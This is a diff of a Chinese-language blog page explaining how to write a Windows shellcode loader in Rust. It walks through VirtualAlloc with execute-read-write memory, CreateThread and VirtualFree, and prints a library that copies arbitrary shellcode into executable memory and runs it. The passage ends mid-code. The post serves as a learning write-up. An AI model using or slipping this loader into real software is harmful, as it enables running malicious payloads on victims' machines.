@@ -1,55 +1,98 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-    <title>HUGO.386</title>
-    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
-    <meta content="utf-8" http-equiv="encoding">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="format-detection" content="telephone=no" />
-    <meta name="theme-color" content="#000084" />
-    <link rel="icon" href="https://fumerem.github.io/favicon.ico">
-    <link rel="canonical" href="https://fumerem.github.io">
-    
-    
-</head>
-<body>
-<nav class="navbar navbar-inverse navbar-fixed-top">
-    <div class="navbar-inner">
-        <div class="container">
-            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
-            <a class="brand" href="https://fumerem.github.io">HUGO.386</a>
-            <div class="nav-collapse collapse">
-                <ul class="nav">
-                    
-                    
-                        
-                            <li>
-                                <a href="/about/">
-                                    
-                                    <span>About</span>
-                                </a>
-                            </li>
-                        
-                    
-                        
-                            <li>
-                                <a href="/posts/">
-                                    
-                                    <span>All posts</span>
-                                </a>
-                            </li>
-                        
-                    
-                </ul>
-            </div>
-        </div>
-    </div>
-</nav><div id="content" class="container">
+<html lang="en">
 
-<div class="row-fluid navmargin">
-    <div class="page-header">
-        <h1>rust编写shellcode加载器 - Sun, Jun 12, 2022</h1>
-    </div>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Fumerem">
+    <meta name="description" content="https://fumerem.github.io">
+    <meta name="keywords" content="blog,developer,personal">
+
+    <meta property="og:site_name" content="rem &#39;s blog">
+    <meta property="og:title" content="
+  rust编写shellcode加载器 - rem &#39;s blog
+">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://fumerem.github.io/posts/rust/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/">
+    <meta property="og:image" content="https://fumerem.github.io">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="https://fumerem.github.io/posts/rust/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/">
+    <meta name="twitter:image" content="https://fumerem.github.io">
+
+    <base href="https://fumerem.github.io/posts/rust/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/">
+    <title>
+  rust编写shellcode加载器 - rem &#39;s blog
+</title>
+
+    <link rel="canonical" href="https://fumerem.github.io/posts/rust/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/">
     
+    <link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+    <link rel="stylesheet" href="/css/normalize.min.css">
+    <link rel="stylesheet" href="/css/style.min.css">
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    
+      <link rel="alternate" href="https://fumerem.github.io/index.xml" type="application/rss+xml" title="rem &#39;s blog">
+      <link href="https://fumerem.github.io/index.xml" rel="feed" type="application/rss+xml" title="rem &#39;s blog" />
+    
+
+    <meta name="generator" content="Hugo 0.100.2" />
+  </head>
+
+  <body class="">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">rem &#39;s blog</a>
+    <input type="checkbox" id="menu-control"/>
+    <label class="menu-mobile  float-right " for="menu-control">
+      <span class="btn-mobile  float-right ">&#9776;</span>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://fumerem.github.io/about">About</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://fumerem.github.io/posts">Posts</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://github.com/fumerem">Project</a>
+            </li>
+          
+            <li class="navigation-item  align-center ">
+              <a class="navigation-link" href="https://fumerem.github.io/index.xml">Rss</a>
+            </li>
+          
+        
+        
+      </ul>
+    </label>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+  <article>
+    <header>
+      <h1 class="title">rust编写shellcode加载器</h1>
+      <h2 class="date">June 12, 2022</h2>
+
+      
+    </header>
+
     <p>​	突发奇想用rust写一个shellcode加载器,花了两天研究了思路和大佬的代码.</p>
 <p>项目地址:https://github.com/fumerem/shellcode_loader</p>
 <h2 id="0x00-shellcode加载器原理">0x00 shellcode加载器原理</h2>
@@ -68,19 +111,19 @@ DWORD flProtect     #该内存的初始保护属性
 };</p>
 </blockquote>
 <p>代码实现</p>
-<pre tabindex="0"><code>unsafe {
-	memory.ptr = Memory::VirtualAlloc(
-		ptr::null(),
-		//memory address to distribute
-		len,
-		//memory size
-		Memory::MEM_COMMIT | Memory::MEM_RESERVE,
-		//alloc type
-		Memory::PAGE_EXECUTE_READWRITE,
-		//protect attribute
-	) as *mut u8;
-};
-</code></pre><h3 id="createthread">CreateThread</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">memory</span><span class="p">.</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Memory</span>::<span class="n">VirtualAlloc</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">ptr</span>::<span class="n">null</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">//memory address to distribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">		</span><span class="n">len</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">//memory size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">		</span><span class="n">Memory</span>::<span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Memory</span>::<span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">//alloc type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">		</span><span class="n">Memory</span>::<span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">//protect attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span></code></pre></div><h3 id="createthread">CreateThread</h3>
 <blockquote>
 <p>创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread</p>
 <p>HANDLE CreateThread (
@@ -93,211 +136,198 @@ LPDWORD lpThreadId           #保存新线程的id
 )</p>
 </blockquote>
 <p>代码实现</p>
-<pre tabindex="0"><code>th.handle = Threading::CreateThread(
-	ptr::null_mut(),
-	//thread protect attribute
-	0,
-	//stack attribute
-	Some(ep),
-	//pointer to thread func
-	ptr::null_mut(),
-	//prama to thread func
-	windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
-	//thread create flags
-	&amp;mut th.tid,
-	//thread id
-).unwrap();
-</code></pre><h3 id="virtualfree">VirtualFree</h3>
-<pre tabindex="0"><code>VirtualFreeEx{编辑 播报
-	HANDLE hProcess, // 要释放内存所在进程的句柄
-	LPVOID lpAddress, // 区域地址
-	DWORD dwSize, // 区域大小，字节
-	DWORD dwFreeType //类型
-};
-</code></pre><p>代码实现</p>
-<pre tabindex="0"><code>Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
-</code></pre><p>lib.rs全部代码</p>
-<pre tabindex="0"><code>use std::ptr;
-use std::slice;
-use std::mem;
-use std::ffi::c_void;
-use windows::Win32::System::Memory;
-use windows::Win32::Foundation;
-use windows::Win32::Foundation::WIN32_ERROR;
-use windows::Win32::System::Threading;
-use windows::Win32::System::WindowsProgramming;
-
-pub struct DistributeMemory {
-	len: usize,
-	ptr: *mut u8,
-}
-
-impl Drop for DistributeMemory {
-	fn drop(&amp;mut self) {
-		unsafe{
-			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
-		}
-	}
-}
-
-impl DistributeMemory {
-	fn new(len: usize) -&gt; Result&lt;DistributeMemory, WIN32_ERROR&gt; {
-		let mut memory = DistributeMemory {
-			len,
-			ptr: ptr::null_mut(),
-		};
-		
-		unsafe {
-			memory.ptr = Memory::VirtualAlloc(
-				ptr::null(),
-				//memory address to distribute
-				len,
-				//memory size
-				Memory::MEM_COMMIT | Memory::MEM_RESERVE,
-				//alloc type
-				Memory::PAGE_EXECUTE_READWRITE,
-				//protect attribute
-			) as *mut u8;
-		};
-		
-		if memory.ptr.is_null() {
-			Err( unsafe{ Foundation::GetLastError()} )
-		} else {
-			Ok(memory)
-		}
-	}
-	
-	pub fn as_slice_mut(&amp;mut self) -&gt; &amp;mut[u8] {
-		unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice
-	}
-	
-	pub fn as_ptr(&amp;self) -&gt; *mut u8 {
-		self.ptr
-	}
-}
-
-pub struct Thread {
-	handle: Foundation::HANDLE,
-	tid: u32,
-}
-
-impl Drop for Thread {
-	fn drop(&amp;mut self) {
-		unsafe { Foundation::CloseHandle(self.handle) };
-	}
-}
-
-impl Thread {
-	pub unsafe fn run(start: *const u8) -&gt; Result&lt;Thread, WIN32_ERROR&gt; {
-		let mut th = Thread {
-			handle: Foundation::HANDLE(0),
-			tid: 0,
-		};
-		
-		let ep: extern &#34;system&#34; fn(*mut c_void) -&gt; u32 = { std::mem::transmute(start) };
-		
-		th.handle = Threading::CreateThread(
-			ptr::null_mut(),
-			//thread protect attribute
-			0,
-			//stack attribute
-			Some(ep),
-			//pointer to thread func
-			ptr::null_mut(),
-			//prama to thread func
-			windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
-			//thread create flags
-			&amp;mut th.tid,
-			//thread id
-		).unwrap();
-		
-		if th.handle == Foundation::HANDLE(0) {
-			Err(Foundation::GetLastError())
-		} else {
-			Ok(th)
-		}
-	}
-	
-	pub fn wait(&amp;self) -&gt; Result&lt;(), WIN32_ERROR&gt; {
-		let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) };
-		if status == 0 {
-			Ok(())
-		} else {
-			Err( unsafe{Foundation::GetLastError()} )
-		}
-	}
-}
-
-pub fn run(shellcode: Vec&lt;u8&gt;) -&gt; Result&lt;(), WIN32_ERROR&gt; {
-	let mut me = DistributeMemory::new(shellcode.len())?;
-	let ms = me.as_slice_mut();
-	ms[..shellcode.len()].copy_from_slice(shellcode.as_slice());
-	let t = unsafe {
-		Thread::run(me.as_ptr())
-	}?;
-	t.wait()
-}
-</code></pre><h2 id="0x02-存在的缺陷">0x02 存在的缺陷</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">th</span><span class="p">.</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Threading</span>::<span class="n">CreateThread</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">ptr</span>::<span class="n">null_mut</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">//thread protect attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="mi">0</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">//stack attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="nb">Some</span><span class="p">(</span><span class="n">ep</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">//pointer to thread func
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="n">ptr</span>::<span class="n">null_mut</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">//prama to thread func
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">System</span>::<span class="n">Threading</span>::<span class="n">THREAD_CREATION_FLAGS</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">//thread create flags
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">th</span><span class="p">.</span><span class="n">tid</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">//thread id
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></div><h3 id="virtualfree">VirtualFree</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">VirtualFreeEx</span><span class="p">{</span><span class="err">编辑</span><span class="w"> </span><span class="err">播报</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="c1">// 要释放内存所在进程的句柄
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpAddress</span><span class="p">,</span><span class="w"> </span><span class="c1">// 区域地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwSize</span><span class="p">,</span><span class="w"> </span><span class="c1">// 区域大小，字节
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwFreeType</span><span class="w"> </span><span class="c1">//类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span><span class="w">
+</span></span></span></code></pre></div><p>代码实现</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">Memory</span>::<span class="n">VirtualFree</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ptr</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">Memory</span>::<span class="n">MEM_RELEASE</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>lib.rs全部代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">ptr</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">slice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">mem</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">ffi</span>::<span class="n">c_void</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">System</span>::<span class="n">Memory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">Foundation</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">Foundation</span>::<span class="n">WIN32_ERROR</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">System</span>::<span class="n">Threading</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">System</span>::<span class="n">WindowsProgramming</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">DistributeMemory</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">len</span>: <span class="kt">usize</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">ptr</span>: <span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="kt">u8</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">impl</span><span class="w"> </span><span class="nb">Drop</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">DistributeMemory</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">fn</span> <span class="nf">drop</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">unsafe</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">Memory</span>::<span class="n">VirtualFree</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ptr</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_void</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">Memory</span>::<span class="n">MEM_RELEASE</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">impl</span><span class="w"> </span><span class="n">DistributeMemory</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">fn</span> <span class="nf">new</span><span class="p">(</span><span class="n">len</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="n">DistributeMemory</span><span class="p">,</span><span class="w"> </span><span class="n">WIN32_ERROR</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DistributeMemory</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">len</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">ptr</span>: <span class="nc">ptr</span>::<span class="n">null_mut</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">memory</span><span class="p">.</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Memory</span>::<span class="n">VirtualAlloc</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">ptr</span>::<span class="n">null</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="c1">//memory address to distribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">				</span><span class="n">len</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="c1">//memory size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">				</span><span class="n">Memory</span>::<span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Memory</span>::<span class="n">MEM_RESERVE</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="c1">//alloc type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">				</span><span class="n">Memory</span>::<span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="c1">//protect attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">			</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="n">memory</span><span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">is_null</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nb">Err</span><span class="p">(</span><span class="w"> </span><span class="k">unsafe</span><span class="p">{</span><span class="w"> </span><span class="n">Foundation</span>::<span class="n">GetLastError</span><span class="p">()}</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nb">Ok</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">as_slice_mut</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kp">&amp;</span><span class="nc">mut</span><span class="p">[</span><span class="kt">u8</span><span class="p">]</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">slice</span>::<span class="n">from_raw_parts_mut</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="c1">//turn pointer to mut slice
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">as_ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="kt">u8</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="bp">self</span><span class="p">.</span><span class="n">ptr</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Thread</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">handle</span>: <span class="nc">Foundation</span>::<span class="n">HANDLE</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">tid</span>: <span class="kt">u32</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">impl</span><span class="w"> </span><span class="nb">Drop</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Thread</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">fn</span> <span class="nf">drop</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Foundation</span>::<span class="n">CloseHandle</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">handle</span><span class="p">)</span><span class="w"> </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">impl</span><span class="w"> </span><span class="n">Thread</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">pub</span><span class="w"> </span><span class="k">unsafe</span><span class="w"> </span><span class="k">fn</span> <span class="nf">run</span><span class="p">(</span><span class="n">start</span>: <span class="o">*</span><span class="k">const</span><span class="w"> </span><span class="kt">u8</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="n">Thread</span><span class="p">,</span><span class="w"> </span><span class="n">WIN32_ERROR</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">th</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Thread</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">handle</span>: <span class="nc">Foundation</span>::<span class="n">HANDLE</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">tid</span>: <span class="mi">0</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="kd">let</span><span class="w"> </span><span class="n">ep</span>: <span class="nc">extern</span><span class="w"> </span><span class="s">&#34;system&#34;</span><span class="w"> </span><span class="k">fn</span><span class="p">(</span><span class="o">*</span><span class="k">mut</span><span class="w"> </span><span class="n">c_void</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">u32</span> <span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">std</span>::<span class="n">mem</span>::<span class="n">transmute</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="w"> </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">th</span><span class="p">.</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Threading</span>::<span class="n">CreateThread</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">ptr</span>::<span class="n">null_mut</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">//thread protect attribute
